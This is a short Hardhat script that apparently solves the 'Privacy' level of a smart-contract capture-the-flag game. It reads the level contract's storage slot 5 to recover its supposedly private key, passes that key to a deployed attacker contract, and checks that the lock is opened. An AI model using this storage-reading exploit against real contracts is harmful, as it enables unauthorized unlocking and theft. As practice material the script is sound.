const { ethers } = require("hardhat");
const hre = require("hardhat");
async function main() {
    
    //Params
    levelAddress = "0x470Cc5d4722D7DCAF3A9b59cc41C0d1c69d5969a";
    contractName = "Privacy";

    const account = await hre.ethers.getSigner();
    console.log(`Working with account ${account.address}`);
    const Level = await hre.ethers.getContractFactory(contractName);
    const level = await Level.attach(levelAddress);
    // const level = await Level.deploy();
    console.log(`Level at address ${levelAddress}`);

    let keyBytes32 = ethers.provider.getStorageAt(level.address,5);

    const Attacker = await hre.ethers.getContractFactory(`Attacker${contractName}`);
    const attacker = await Attacker.deploy(levelAddress,keyBytes32);
    console.log(`Attacker at ${attacker.address}`);

    let tx = await attacker.attack();
    let tr = await tx.wait();

    let result = await level.locked();
    console.log(result);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
